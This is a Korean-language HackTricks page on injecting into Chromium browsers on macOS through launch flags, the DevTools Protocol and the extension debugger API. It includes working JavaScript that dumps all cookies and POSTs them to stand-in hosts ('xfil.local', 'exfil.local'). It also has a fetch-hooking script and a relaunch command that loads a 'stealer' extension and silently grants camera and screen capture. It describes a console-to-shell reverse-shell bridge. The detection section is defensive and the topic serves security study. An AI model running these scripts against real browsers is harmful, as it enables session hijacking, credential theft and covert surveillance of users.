# macOS Chromium Injection

{{#include ../../../banners/hacktricks-training.md}}

## 기본 정보

Google Chrome, Microsoft Edge, Brave, Arc, Vivaldi, Opera와 같은 Chromium 기반 브라우저는 모두 동일한 command-line switches, preference files, DevTools automation interfaces를 사용합니다. macOS에서는 GUI access가 있는 모든 사용자가 기존 browser session을 종료한 다음, target의 entitlements로 실행되는 arbitrary flags, extensions 또는 DevTools endpoints를 사용해 다시 열 수 있습니다.

#### macOS에서 custom flags로 Chromium 실행

macOS는 각 Chromium profile마다 하나의 UI instance만 유지하므로, instrumentation을 수행하려면 일반적으로 browser를 강제로 종료해야 합니다(예: `osascript -e 'tell application "Google Chrome" to quit'`). Attackers는 일반적으로 `open -na "Google Chrome" --args <flags>`를 사용해 browser를 다시 실행하며, 이를 통해 app bundle을 수정하지 않고 arguments를 inject할 수 있습니다. 이 command를 user LaunchAgent(`~/Library/LaunchAgents/*.plist`) 또는 login hook 내부에서 실행하면 reboot/logoff 후 tampered browser가 다시 생성되도록 할 수 있습니다.

#### `--load-extension` Flag

`--load-extension` flag는 unpacked extensions를 자동으로 로드합니다(comma-separated paths). 여기에 `--disable-extensions-except`를 함께 사용하면 legitimate extensions를 차단하면서 payload만 강제로 실행할 수 있습니다. Malicious extensions는 `debugger`, `webRequest`, `cookies`와 같은 high-impact permissions를 요청해 DevTools protocols로 pivot하거나, CSP headers를 patch하거나, HTTPS를 downgrade하거나, browser가 시작되는 즉시 session material을 exfiltrate할 수 있습니다.<sup>[[4]](#references)</sup>

#### `--remote-debugging-port` / `--remote-debugging-pipe` Flags

이 switches는 TCP 또는 pipe를 통해 Chrome DevTools Protocol (CDP)을 노출하므로 external tooling이 browser를 제어할 수 있습니다. Google은 이 interface를 이용한 infostealer abuse가 광범위하게 발생하는 것을 확인했으며, Chrome 136(2025년 3월)부터 browser가 non-standard `--user-data-dir`로 실행되지 않는 한 default profile에서 해당 switches가 무시됩니다. 이는 real profiles에 App-Bound Encryption을 적용하지만, attackers는 여전히 fresh profile을 생성하고 victim이 그 안에서 authenticate하도록 유도한 뒤(phishing/triage assistance), CDP를 통해 cookies, tokens, device trust states 또는 WebAuthn registrations를 harvest할 수 있습니다.<sup>[[5]](#references)</sup>

#### `--user-data-dir` Flag

이 flag는 전체 browser profile(History, Cookies, Login Data, Preference files 등)을 attacker-controlled path로 redirect합니다. modern Chrome builds에서 `--remote-debugging-port`와 함께 사용하려면 필수이며, tampered profile을 격리하는 데도 사용할 수 있습니다. 이를 통해 security prompts를 비활성화하고, extensions를 자동 설치하며, default schemes를 변경하는 사전 설정된 `Preferences` 또는 `Secure Preferences` files를 배치할 수 있습니다.

#### `--use-fake-ui-for-media-stream` Flag

이 switch는 camera/mic permission prompt를 우회하므로 `getUserMedia`를 호출하는 모든 page가 즉시 access를 얻습니다. 이를 `--auto-select-desktop-capture-source="Entire Screen"`, `--kiosk`와 같은 flags 또는 CDP `Browser.grantPermissions` commands와 결합하면 user interaction 없이 audio/video를 조용히 capture하거나, desktop을 share하거나, WebRTC permission checks를 충족할 수 있습니다.<sup>[[4]](#references)</sup>

## 실제 환경에서 확인된 Delivery & Relaunch Patterns

CDP abuse는 initial payload라기보다 일반적으로 **post-exploitation** stage입니다. 최근 macOS developer-targeting campaign은 poisoned Xcode **`Run Script` build phase**(`PBXShellScriptBuildPhase`)를 사용해 victim이 project를 단순히 clone하거나 open할 때가 아니라 **build**할 때만 code가 실행되도록 했습니다. 첫 실행 이후 malware는 다른 `.xcodeproj` trees에도 감염되고, malicious Git `pre-commit` hooks를 추가했으며, 더 많은 Xcode projects를 찾기 위해 ZIP archives를 검색했습니다.<sup>[[3]](#references)</sup>

Chromium abuse에서 이것이 중요한 이유는 attacker가 browser binary 자체를 patch할 필요가 없기 때문입니다. 짧게 실행되는 build-phase / `osascript` stager는 대신 **browser wrapper**(LaunchAgent, login item, Dock entry, trojanized app launcher 등)를 설치해 사용자가 browser를 시작할 때마다 attacker-controlled flags로 legitimate browser를 다시 열 수 있습니다.<sup>[[3]](#references)</sup>

> [!TIP]
> Developer endpoints에서는 `.pbxproj` files, `.git/hooks/pre-commit`, `.xcodeproj`를 포함하는 ZIPs에서 예상하지 못한 `curl`, `osascript`, `xxd`, 중첩된 `base64` 또는 Chrome relaunch logic을 검사하세요.

## Remote Debugging & DevTools Protocol Abuse

Chrome이 전용 `--user-data-dir` 및 `--remote-debugging-port`로 다시 실행되면 CDP를 통해(예: `chrome-remote-interface`, `puppeteer`, `playwright` 사용) 연결하고 high-privilege workflows를 script할 수 있습니다.

- **Cookie/session theft:** `Network.getAllCookies` 및 `Storage.getCookies`는 HttpOnly values를 반환합니다. App-Bound encryption이 일반적으로 filesystem access를 차단하더라도 CDP가 실행 중인 browser에 decrypt를 요청하기 때문입니다.
- **Permission tampering:** `Browser.grantPermissions` 및 `Emulation.setGeolocationOverride`를 사용하면 camera/mic prompts를 우회하거나(`--use-fake-ui-for-media-stream`과 함께 사용할 때 특히 효과적), location-based security checks를 위조할 수 있습니다.
- **Keystroke/script injection:** `Runtime.evaluate`는 active tab 내부에서 arbitrary JavaScript를 실행하므로 credential lifting, DOM patching 또는 navigation 이후에도 유지되는 persistence beacons injection이 가능합니다.<sup>[[1]](#references)</sup>
- **Live exfiltration:** `Network.webRequestWillBeSentExtraInfo` 및 `Fetch.enable`은 disk artifacts를 건드리지 않고 authenticated requests/responses를 real time으로 intercept합니다.
```javascript
import CDP from 'chrome-remote-interface';

(async () => {
const client = await CDP({host: '127.0.0.1', port: 9222});
const {Network, Runtime} = client;
await Network.enable();
const {cookies} = await Network.getAllCookies();
console.log(cookies.map(c => `${c.domain}:${c.name}`));
await Runtime.evaluate({expression: "fetch('https://xfil.local', {method:'POST', body:document.cookie})"});
await client.close();
})();
```
Chrome 136은 기본 profile에서 CDP를 차단하므로, 피해자의 기존 `~/Library/Application Support/Google/Chrome` 디렉터리를 staging 경로로 복사해도 더 이상 복호화된 cookies를 얻을 수 없다. 대신 사용자에게 instrumented profile 내부에서 인증하도록 social-engineer하거나(예: "도움이 되는" support session), CDP로 제어되는 network hooks를 통해 전송 중인 MFA tokens를 캡처한다.<sup>[[5]](#references)</sup>

### XCSSET-style CDP Backdoor Chain

실용적인 malware 패턴은 다음과 같다:

1. Chrome이 실행될 때마다 userland implant 또는 wrapper를 재시작한다.
2. `--remote-debugging-port=<port>`와 함께 legitimate browser를 실행하고, Chrome 136 이상에서는 일반적으로 paired non-default `--user-data-dir=<dir>`도 지정한다.
3. local CDP WebSocket에 연결하고 `Page.addScriptToEvaluateOnNewDocument`로 pre-document hook을 등록하는 helper를 시작한다.<sup>[[2]](#references)</sup>

이 helper는 site code가 실행되기 **전에** JavaScript를 주입할 수 있으므로, 디스크의 파일을 수정하지 않고도 `window.fetch`, `XMLHttpRequest`, wallet providers 또는 autofill flows에 hook을 설치하는 데 적합하다.<sup>[[3]](#references)</sup>
```javascript
await Page.enable();
await Runtime.enable();
await Page.addScriptToEvaluateOnNewDocument({
source: `
const oldFetch = window.fetch;
window.fetch = async (...args) => {
console.log('__HT__' + JSON.stringify(args[0]));
return oldFetch(...args);
};
`
});
Runtime.consoleAPICalled(({args}) => { /* helper parses __HT__ */ });
```
더 강력한 변형은 browser를 **host command bridge**로 전환합니다. 주입된 JavaScript가 delimiter가 표시된 `console.log`를 발생시키면, 로컬 helper가 `Runtime.consoleAPICalled`를 감시하고 marker를 제거한 뒤, 나머지 내용을 host shell을 통해 실행합니다(예: Go의 `exec.Command`). 그런 다음 공격자의 WebSocket을 통해 stdout/stderr를 반환합니다. 이를 통해 tab 수준의 script 실행이 대부분 fileless인 reverse shell로 확장됩니다.<sup>[[3]](#references)</sup>

## Debugger API를 통한 Extension-Based Injection

2023년의 "Chrowned by an Extension" 연구는 악성 extension이 `chrome.debugger` API를 사용해 모든 tab에 attach하고 `--remote-debugging-port`와 동일한 DevTools 권한을 획득할 수 있음을 입증했습니다.<sup>[[6]](#references)</sup> 이는 기존의 isolation 가정(extension은 자체 context에 머문다는 가정)을 깨뜨리며 다음을 가능하게 합니다.

- `Network.getAllCookies`/`Fetch.getResponseBody`를 사용한 조용한 cookie 및 credential theft.
- site permission(camera, microphone, geolocation) 수정 및 security interstitial 우회. 이를 통해 phishing page가 Chrome dialog를 사칭할 수 있습니다.
- `Page.handleJavaScriptDialog`, `Page.setDownloadBehavior` 또는 `Security.handleCertificateError`를 programmatically driving하여 TLS warning, download 또는 WebAuthn prompt를 on-path tampering.

사용자 상호작용이 필요하지 않도록 `--load-extension`/`--disable-extensions-except`를 사용해 extension을 load합니다. API를 weaponize하는 최소한의 background script는 다음과 같습니다.
```javascript
chrome.tabs.onUpdated.addListener((tabId, info) => {
if (info.status !== 'complete') return;
chrome.debugger.attach({tabId}, '1.3', () => {
chrome.debugger.sendCommand({tabId}, 'Network.enable');
chrome.debugger.sendCommand({tabId}, 'Network.getAllCookies', {}, (res) => {
fetch('https://exfil.local/dump', {method: 'POST', body: JSON.stringify(res.cookies)});
});
});
});
```
이 extension은 `Debugger.paused` 이벤트를 subscribe하여 JavaScript 변수를 읽고, inline script를 patch하거나 navigation 이후에도 유지되는 custom breakpoint를 추가할 수 있습니다. 모든 작업이 사용자의 GUI session 내부에서 실행되므로 Gatekeeper와 TCC가 trigger되지 않으며, 이 technique은 이미 사용자 context에서 execution을 획득한 malware에 적합합니다.<sup>[[6]](#references)</sup>

## Detection & Hunting

- `--remote-debugging-port`, `--remote-debugging-pipe` 또는 의심스러운 `--user-data-dir`와 함께 실행된 Chromium browser에 alert를 설정합니다. 특히 parent가 `bash`, `sh`, `osascript`, `xcodebuild` 또는 LaunchAgent helper인 경우를 확인합니다.
- helper가 로컬 CDP WebSocket을 열고, `Page.addScriptToEvaluateOnNewDocument`를 register한 다음, 장시간 유지되는 outbound WebSocket/HTTPS connection을 생성하는 짧은 chain을 찾습니다.
- browser의 `Runtime.consoleAPICalled` activity를 attacker가 제공한 command를 실행하는 child shell 또는 helper process와 correlate하여 console-to-shell bridge를 Hunting합니다.
- developer Mac에서는 `.pbxproj`의 `PBXShellScriptBuildPhase` entries, Git `pre-commit` hooks, Dock/login item relauncher 및 ZIP에 포함된 Xcode project에서 browser wrapper installation을 검토합니다.
```bash
ps auxww | rg 'Chrome|Brave|Edge.*(--remote-debugging-port|--remote-debugging-pipe|--user-data-dir)'
lsof -nP -iTCP -sTCP:LISTEN | rg 'Chrome|Brave|Edge'
find ~/Library/LaunchAgents /Library/LaunchAgents -name '*.plist' -exec plutil -p {} \; 2>/dev/null | rg 'remote-debugging|Google Chrome|Brave|Edge'
rg -n 'PBXShellScriptBuildPhase|curl|osascript|xxd|base64' ~/Code --glob '*.pbxproj'
```
### 도구

- [https://github.com/breakpointHQ/snoop](https://github.com/breakpointHQ/snoop) - payload extensions를 사용한 Chromium 실행을 자동화하고 interactive CDP hooks를 노출합니다.
- [https://github.com/breakpointHQ/VOODOO](https://github.com/breakpointHQ/VOODOO) - macOS operators를 위한 traffic interception 및 browser instrumentation에 중점을 둔 유사한 도구입니다.
- [https://github.com/cyrus-and/chrome-remote-interface](https://github.com/cyrus-and/chrome-remote-interface) - `--remote-debugging-port` 인스턴스가 실행 중일 때 Chrome DevTools Protocol dumps(cookies, DOM, permissions)를 스크립팅하는 Node.js library입니다.

### 예제
```bash
# Launch an instrumented Chrome profile listening on CDP and auto-granting media/capture access
osascript -e 'tell application "Google Chrome" to quit'
open -na "Google Chrome" --args \
--user-data-dir="$TMPDIR/chrome-privesc" \
--remote-debugging-port=9222 \
--load-extension="$PWD/stealer" \
--disable-extensions-except="$PWD/stealer" \
--use-fake-ui-for-media-stream \
--auto-select-desktop-capture-source="Entire Screen"

# Intercept traffic
voodoo intercept -b chrome
```
도구 링크에서 더 많은 예시를 확인하세요.

## 참고 자료

- [1] [Chrome DevTools Protocol - Runtime domain](https://chromedevtools.github.io/devtools-protocol/v8/Runtime/)
- [2] [Chrome DevTools Protocol - Page domain](https://chromedevtools.github.io/devtools-protocol/tot/Page/)
- [3] [The Xcode Assassin Returns: 최신 XCSSET 버전에 대한 심층 분석 - Unit 42](https://unit42.paloaltonetworks.com/xcsset-v40-malware-analysis/)
- [4] [X의 Ron Masas (@RonMasas)](https://twitter.com/RonMasas/status/1758106347222995007)
- [5] [보안 강화를 위한 remote debugging switches 변경 사항 - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [6] [Chrowned by an Extension: Debugger API를 통한 Chrome DevTools Protocol 악용 (arXiv:2305.11506)](https://arxiv.org/abs/2305.11506)

{{#include ../../../banners/hacktricks-training.md}}
